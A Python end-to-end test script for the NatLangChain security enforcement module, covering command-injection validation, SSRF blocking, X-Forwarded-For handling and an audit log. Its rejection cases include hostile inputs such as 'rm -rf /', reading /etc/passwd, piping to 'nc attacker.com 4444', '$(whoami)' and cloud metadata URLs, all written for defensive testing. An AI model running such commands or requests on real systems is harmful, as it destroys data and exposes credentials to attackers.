#!/usr/bin/env python3
"""
End-to-End Security Tests for NatLangChain Security Enforcement.

This script tests all security features added during the audit:
1. Command injection prevention (input validation)
2. SSRF protection (IP and host blocking)
3. X-Forwarded-For spoofing prevention
4. Fluent builder API
5. Exception mode
6. Context manager (temporary rules)
"""

import os
import sys

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

def test_section(name):
    print(f"\n{'='*60}")
    print(f"[{name}]")
    print('='*60)

def test_pass(msg):
    print(f"✓ PASS: {msg}")
    return True

def test_fail(msg, error=None):
    print(f"✗ FAIL: {msg}")
    if error:
        print(f"       {error}")
    return False

def run_tests():
    """Run all security tests."""
    results = {"passed": 0, "failed": 0}

    # ========================================
    # TEST 1: Import Tests
    # ========================================
    test_section("1. IMPORT TESTS")

    try:
        from security_enforcement import (
            EnforcementError,
            EnforcementResult,
            ImmutableAuditLog,
            NetworkEnforcement,
            NetworkRuleBuilder,
            validate_interface_name,
            validate_ip_address,
            validate_port,
        )
        # Alias for test compatibility
        validate_interface = validate_interface_name
        test_pass("Import all security_enforcement components")
        results["passed"] += 1
    except Exception as e:
        test_fail("Import security_enforcement", str(e))
        results["failed"] += 1
        return results  # Can't continue without imports

    try:
        # Import directly from the module file to avoid Flask dependency
        # (api/__init__.py imports Flask blueprints)
        import importlib.util
        ssrf_path = os.path.join(os.path.dirname(__file__), 'src', 'api', 'ssrf_protection.py')
        spec = importlib.util.spec_from_file_location("ssrf_protection", ssrf_path)
        ssrf_module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(ssrf_module)

        BLOCKED_IP_RANGES = ssrf_module.BLOCKED_IP_RANGES
        BLOCKED_HOSTS = ssrf_module.BLOCKED_HOSTS
        TRUSTED_PROXIES = ssrf_module.TRUSTED_PROXIES
        is_valid_ip = ssrf_module.is_valid_ip
        is_private_ip = ssrf_module.is_private_ip
        validate_url_for_ssrf = ssrf_module.validate_url_for_ssrf
        is_safe_peer_endpoint = ssrf_module.is_safe_peer_endpoint
        get_client_ip_from_headers = ssrf_module.get_client_ip_from_headers

        test_pass("Import SSRF protection utilities (standalone module)")
        results["passed"] += 1
    except Exception as e:
        test_fail("Import SSRF protection utilities", str(e))
        results["failed"] += 1

    # ========================================
    # TEST 2: Input Validation (Command Injection Prevention)
    # ========================================
    test_section("2. INPUT VALIDATION TESTS (Command Injection Prevention)")

    # Test IP validation
    valid_ips = ["192.168.1.1", "10.0.0.1", "8.8.8.8", "2001:db8::1", "::1"]
    invalid_ips = [
        "192.168.1.1; rm -rf /",
        "10.0.0.1 && cat /etc/passwd",
        "8.8.8.8 | nc attacker.com 4444",
        "$(whoami)",
        "`id`",
        "not-an-ip",
        "192.168.1.256",
        "",
        "  ",
    ]

    for ip in valid_ips:
        is_valid, error = validate_ip_address(ip)
        if is_valid:
            test_pass(f"validate_ip_address: valid '{ip}'")
            results["passed"] += 1
        else:
            test_fail(f"validate_ip_address: should accept '{ip}'", error)
            results["failed"] += 1

    for ip in invalid_ips:
        is_valid, error = validate_ip_address(ip)
        if not is_valid:
            test_pass(f"validate_ip_address: rejects '{ip[:30]}...'")
            results["passed"] += 1
        else:
            test_fail(f"validate_ip_address: should reject '{ip[:30]}...'")
            results["failed"] += 1

    # Test port validation
    valid_ports = [80, 443, 8080, 1, 65535]
    invalid_ports = [0, -1, 65536, 99999, "80; rm -rf /"]

    for port in valid_ports:
        is_valid, error = validate_port(port)
        if is_valid:
            test_pass(f"validate_port: valid {port}")
            results["passed"] += 1
        else:
            test_fail(f"validate_port: should accept {port}", error)
            results["failed"] += 1

    for port in invalid_ports:
        is_valid, error = validate_port(port)
        if not is_valid:
            test_pass(f"validate_port: rejects {port}")
            results["passed"] += 1
        else:
            test_fail(f"validate_port: should reject {port}")
            results["failed"] += 1

    # Test interface validation
    valid_interfaces = ["eth0", "lo", "wlan0", "enp0s3", "docker0"]
    invalid_interfaces = [
        "eth0; rm -rf /",
        "$(whoami)",
        "`id`",
        "../../etc/passwd",
        "eth 0",
        "",
    ]

    for iface in valid_interfaces:
        is_valid, error = validate_interface(iface)
        if is_valid:
            test_pass(f"validate_interface: valid '{iface}'")
            results["passed"] += 1
        else:
            test_fail(f"validate_interface: should accept '{iface}'", error)
            results["failed"] += 1

    for iface in invalid_interfaces:
        is_valid, error = validate_interface(iface)
        if not is_valid:
            test_pass(f"validate_interface: rejects '{iface[:20]}...'")
            results["passed"] += 1
        else:
            test_fail(f"validate_interface: should reject '{iface[:20]}...'")
            results["failed"] += 1

    # ========================================
    # TEST 3: SSRF Protection
    # ========================================
    test_section("3. SSRF PROTECTION TESTS")

    # Test blocked IP ranges
    test_pass(f"BLOCKED_IP_RANGES has {len(BLOCKED_IP_RANGES)} ranges")
    results["passed"] += 1

    # Test blocked hosts
    test_pass(f"BLOCKED_HOSTS has {len(BLOCKED_HOSTS)} hosts")
    results["passed"] += 1

    # Test is_private_ip
    private_ips = ["192.168.1.1", "10.0.0.1", "172.16.0.1", "127.0.0.1", "169.254.169.254"]
    public_ips = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]

    for ip in private_ips:
        if is_private_ip(ip):
            test_pass(f"is_private_ip: correctly identifies '{ip}' as private")
            results["passed"] += 1
        else:
            test_fail(f"is_private_ip: should identify '{ip}' as private")
            results["failed"] += 1

    for ip in public_ips:
        if not is_private_ip(ip):
            test_pass(f"is_private_ip: correctly identifies '{ip}' as public")
            results["passed"] += 1
        else:
            test_fail(f"is_private_ip: should identify '{ip}' as public")
            results["failed"] += 1

    # Test URL validation for SSRF
    blocked_urls = [
        "http://localhost/admin",
        "http://127.0.0.1/secret",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/",  # GCP metadata
        "http://192.168.1.1/admin",
        "http://10.0.0.1/internal",
    ]

    for url in blocked_urls:
        is_safe, error = validate_url_for_ssrf(url)
        if not is_safe:
            test_pass(f"validate_url_for_ssrf: blocks '{url[:40]}...'")
            results["passed"] += 1
        else:
            test_fail(f"validate_url_for_ssrf: should block '{url[:40]}...'")
            results["failed"] += 1

    # ========================================
    # TEST 4: X-Forwarded-For Protection
    # ========================================
    test_section("4. X-FORWARDED-FOR PROTECTION TESTS")

    # Test with no trusted proxies (should use remote_addr)
    result = get_client_ip_from_headers(
        remote_addr="1.2.3.4",
        xff_header="5.6.7.8, 9.10.11.12",
        trusted_proxies=set()
    )
    if result == "1.2.3.4":
        test_pass("No trusted proxies: uses remote_addr (ignores XFF)")
        results["passed"] += 1
    else:
        test_fail(f"No trusted proxies: expected '1.2.3.4', got '{result}'")
        results["failed"] += 1

    # Test with trusted proxy - uses rightmost non-proxy IP
    result = get_client_ip_from_headers(
        remote_addr="10.0.0.1",
        xff_header="5.6.7.8, 9.10.11.12, 10.0.0.2",
        trusted_proxies={"10.0.0.1", "10.0.0.2"}
    )
    if result == "9.10.11.12":
        test_pass("Trusted proxy: uses rightmost non-proxy IP")
        results["passed"] += 1
    else:
        test_fail(f"Trusted proxy: expected '9.10.11.12', got '{result}'")
        results["failed"] += 1

    # Test XFF spoofing attempt (invalid IP in XFF)
    result = get_client_ip_from_headers(
        remote_addr="10.0.0.1",
        xff_header="not-an-ip, 5.6.7.8",
        trusted_proxies={"10.0.0.1"}
    )
    if result == "5.6.7.8":
        test_pass("XFF spoofing: skips invalid IPs")
        results["passed"] += 1
    else:
        test_fail(f"XFF spoofing: expected '5.6.7.8', got '{result}'")
        results["failed"] += 1

    # ========================================
    # TEST 5: Builder Pattern API
    # ========================================
    test_section("5. BUILDER PATTERN API TESTS")

    # Test builder creation
    net = NetworkEnforcement()
    builder = net.rule()
    if isinstance(builder, NetworkRuleBuilder):
        test_pass("NetworkEnforcement.rule() returns NetworkRuleBuilder")
        results["passed"] += 1
    else:
        test_fail("NetworkEnforcement.rule() should return NetworkRuleBuilder")
        results["failed"] += 1

    # Test fluent interface
    try:
        result = net.rule().block().destination("192.168.1.1").port(443)
        if hasattr(result, 'apply'):
            test_pass("Builder has fluent interface (chainable methods)")
            results["passed"] += 1
        else:
            test_fail("Builder missing apply() method")
            results["failed"] += 1
    except Exception as e:
        test_fail("Builder fluent interface", str(e))
        results["failed"] += 1

    # Test builder validation (invalid IP should fail)
    try:
        result = net.rule().block().destination("invalid-ip").apply()
        if not result.success:
            test_pass("Builder validates IP addresses")
            results["passed"] += 1
        else:
            test_fail("Builder should reject invalid IP")
            results["failed"] += 1
    except Exception as e:
        # Exception is also acceptable for invalid input
        test_pass("Builder validates IP (raises exception)")
        results["passed"] += 1

    # ========================================
    # TEST 6: Exception Mode
    # ========================================
    test_section("6. EXCEPTION MODE TESTS")

    # Test that EnforcementError exists
    try:
        err = EnforcementError(EnforcementResult(
            success=False,
            action="test",
            error="test error"
        ))
        if "test error" in str(err):
            test_pass("EnforcementError contains error message")
            results["passed"] += 1
        else:
            test_fail("EnforcementError should contain error message")
            results["failed"] += 1
    except Exception as e:
        test_fail("EnforcementError creation", str(e))
        results["failed"] += 1

    # Test raise_on_failure parameter exists in builder's apply()
    # Note: raise_on_failure is on the builder's apply(), not on block_destination
    import inspect
    builder = net.rule().block().destination("8.8.8.8")
    sig = inspect.signature(builder.apply)
    if 'raise_on_failure' in sig.parameters:
        test_pass("NetworkRuleBuilder.apply() has raise_on_failure parameter")
        results["passed"] += 1
    else:
        test_fail("NetworkRuleBuilder.apply() missing raise_on_failure parameter")
        results["failed"] += 1

    # ========================================
    # TEST 7: Context Manager
    # ========================================
    test_section("7. CONTEXT MANAGER TESTS")

    # Test that temporary_block exists
    if hasattr(net, 'temporary_block'):
        test_pass("NetworkEnforcement has temporary_block method")
        results["passed"] += 1
    else:
        test_fail("NetworkEnforcement missing temporary_block method")
        results["failed"] += 1

    # Test context manager protocol
    if hasattr(net.temporary_block("8.8.8.8", 443), '__enter__'):
        test_pass("temporary_block is a context manager")
        results["passed"] += 1
    else:
        test_fail("temporary_block should be a context manager")
        results["failed"] += 1

    # ========================================
    # TEST 8: Immutable Audit Log
    # ========================================
    test_section("8. IMMUTABLE AUDIT LOG TESTS")

    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        log_file = f.name

    try:
        log = ImmutableAuditLog(log_file)

        # Log an event using append (the correct method name)
        result = log.append("test_action", {"key": "value"})

        if result.success:
            test_pass("ImmutableAuditLog.append() succeeds")
            results["passed"] += 1
        else:
            test_fail(f"ImmutableAuditLog.append() failed: {result.error}")
            results["failed"] += 1

        # Verify hash chain integrity
        if log.verify_integrity():
            test_pass("ImmutableAuditLog hash chain is valid")
            results["passed"] += 1
        else:
            test_fail("ImmutableAuditLog hash chain integrity failed")
            results["failed"] += 1

    except Exception as e:
        test_fail("ImmutableAuditLog tests", str(e))
        results["failed"] += 2
    finally:
        os.unlink(log_file)

    return results

def main():
    print("=" * 60)
    print("NatLangChain Security Enforcement - E2E Test Suite")
    print("=" * 60)

    results = run_tests()

    print("\n" + "=" * 60)
    print("TEST SUMMARY")
    print("=" * 60)
    print(f"Passed: {results['passed']}")
    print(f"Failed: {results['failed']}")
    total = results['passed'] + results['failed']
    if total > 0:
        print(f"Success Rate: {results['passed']/total*100:.1f}%")

    if results['failed'] == 0:
        print("\n✓ ALL TESTS PASSED!")
        return 0
    else:
        print(f"\n✗ {results['failed']} TESTS FAILED")
        return 1

if __name__ == "__main__":
    sys.exit(main())
